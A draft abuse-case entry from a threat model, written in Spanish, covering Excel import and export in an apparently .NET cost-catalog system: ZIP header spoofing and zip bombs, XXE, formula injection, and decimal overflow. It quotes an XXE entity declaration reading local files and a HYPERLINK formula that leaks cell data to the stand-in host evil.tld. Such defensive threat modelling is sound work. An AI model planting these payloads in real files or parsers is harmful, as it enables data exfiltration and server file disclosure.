---
id: ABUSE-XLSX-INJECT-001
type: abuse-case
title: "Inyección de Fórmulas DDE, XXE y Bombas ZIP en Importación y Exportación de Excel"
status: draft
version: "1.1.0"
schema-version: "1.0"
primary-threat-actor: ACT-THREAT-EXT-001
targets-use-cases:
  - UC-COST-CATALOG-001
  - UC-EXEC-REPORT-001
stride-category: "Tampering"
severity: "HIGH"
likelihood: "MEDIUM"
mitigated-by:
  - SEC-REQ-XLSX-001
supersedes: null
superseded-by: null
---

# Abuse Case: Inyección de Fórmulas DDE, XXE y Bombas ZIP en Importación y Exportación de Excel

## 1. Attack Scenario & Preconditions

El atacante (`ACT-THREAT-EXT-001`) abusa del importador `ISafeCatalogImporter` (`CMP-DOC-IO-001` con `ZipArchive` y `ClosedXML` en `SEC-ENC-APP-CORE-001`) al subir plantillas `.xlsx` (`M4` en `UC-COST-CATALOG-001`) o inyecta cadenas y números extremos que luego se procesan en `CMP-COST-ENGINE-001` (`System.Decimal`) y se exportan con `ClosedXML` / `PDFsharp` (`UC-EXEC-REPORT-001`).

## 2. Attack Flow (Step-by-Step)

1. **Vector A (Falsificación de Cabeceras ZIP en `ZipArchive` y XXE en OOXML)**: Dado que un archivo `.xlsx` es un contenedor ZIP, el atacante sube un archivo de `100 KB` cuyas entradas XML declaran `UncompressedSize = 1024` en la cabecera del directorio central ZIP pero contienen un stream DEFLATE de `10 GB` (*ZIP Header Spoofing* para burlar una comprobación ingenua de `ZipArchiveEntry.Length`), o inyecta declaraciones `<!DOCTYPE ... [<!ENTITY xxe SYSTEM "file:///...">]>` en `[Content_Types].xml` / `xl/sharedStrings.xml`.
2. **Vector B (CSV/Excel Formula Injection DDE con Espacios Iniciales en `ClosedXML`)**: El atacante introduce como nombre de cosmético o servicio una cadena precedida por espacios o caracteres de control seguida de `=`, `+`, `-`, `@`, `\t` o `\r` (ej. `"  =HYPERLINK(\"http://evil.tld/leak?data=\"&A1)"`). Si el exportador no inspecciona tras `TrimStart()` ni fuerza `XLDataType.Text` con prefijo `'`, Excel ejecuta la fórmula al abrir el informe (`UC-EXEC-REPORT-001`).
3. **Vector C (Desbordamiento `System.OverflowException` en `System.Decimal` de 128 bits)**: El atacante envía costes o cantidades cercanas a `decimal.MaxValue` ($7.92 \times 10^{28}$), divisores `0` o porcentajes de merma/IVA fuera de rango para disparar `OverflowException` o `DivideByZeroException` durante el recálculo transaccional en cascada (`CMP-COST-ENGINE-001`).

## 3. Business & Security Impact

- **Compromiso de Servidor o Cliente**: Caída del contenedor `.NET 10` por agotamiento del *Large Object Heap (LOH)* (`OutOfMemoryException`), lectura de archivos internos del contenedor o ejecución de fórmulas/exfiltración en el equipo de la directora del centro al abrir el informe Excel.

## 4. Revision History

| Version | Date | Author | Description |
| :--- | :--- | :--- | :--- |
| 1.0.0 | 2026-10-05 | agent-threat-modeler | Especificación inicial del caso de abuso en importación/exportación Excel. |
| 1.1.0 | 2026-10-08 | agent-threat-modeler | Incorporación de vectores técnicos sobre falsificación de cabeceras ZipArchiveEntry.Length, bypass con espacios en ClosedXML y OverflowException en System.Decimal. |
